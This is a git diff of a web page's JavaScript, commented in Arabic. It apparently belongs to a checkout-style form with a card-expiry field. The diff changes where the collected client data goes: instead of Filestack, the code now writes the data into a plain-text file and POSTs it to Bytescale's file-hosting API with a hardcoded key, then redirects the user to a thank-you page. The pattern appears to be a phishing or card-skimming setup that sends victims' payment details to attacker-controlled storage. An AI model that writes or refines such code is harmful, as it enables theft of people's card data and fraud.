@@ -171,7 +171,7 @@ document.addEventListener('DOMContentLoaded', function () {
       fileContent += `Coupon Code: ${couponCode}\n`;
 
       // رفع الملف إلى Filestack
-      uploadFileToFilestack(fileContent); 
+      uploadFileToBytescale(fileContent); 
 
      
     }
@@ -253,19 +253,30 @@ document.addEventListener('DOMContentLoaded', function () {
   }
 
   // دالة لرفع الملف إلى Filestack
-  function uploadFileToFilestack(fileContent) {
-    const client = filestack.init('A7fSrsBg3RjybN1kkK99lz');  // استبدل بـ API Key الخاص بك
+  function uploadFileToBytescale(fileContent) {
+    const apiKey = 'public_FW25cKPDX7Mjf9E9kNGWJ5BbUKLk'; // استبدل بـ API Key الخاص بـ Bytescale
+    const endpoint = 'https://api.bytescale.com/upload'; // رابط واجهة API الخاصة بـ Bytescale
+
     const fileBlob = new Blob([fileContent], { type: 'text/plain' });
-    client.upload(fileBlob)
-      .then((res) => {
-        console.log('File uploaded successfully:', res);
-        // إعادة توجيه المستخدم إلى صفحة "شكرًا"
-        window.location.href = 'thank-you.html';  // قم بتغيير الرابط إلى صفحة "شكراً" الخاصة بك
-      })
-      .catch((err) => {
-        console.error('Error uploading file:', err);
-      });
-  }
+
+    const formData = new FormData();
+    formData.append('file', fileBlob, 'client-data.txt'); // اسم الملف مع الامتداد
+    formData.append('key', apiKey); // تضمين مفتاح API
+
+    fetch(endpoint, {
+        method: 'POST',
+        body: formData,
+    })
+        .then((response) => response.json())
+        .then((res) => {
+            console.log('File uploaded successfully:', res);
+            // إعادة توجيه المستخدم إلى صفحة "شكرًا"
+            window.location.href = 'thank-you.html'; // قم بتغيير الرابط إلى صفحة "شكراً" الخاصة بك
+        })
+        .catch((err) => {
+            console.error('Error uploading file:', err);
+        });
+}
 
   // إضافة حدث لملء تاريخ الصلاحية تلقائيًا بـ "/"
   const expiryInput = document.getElementById('expiry');
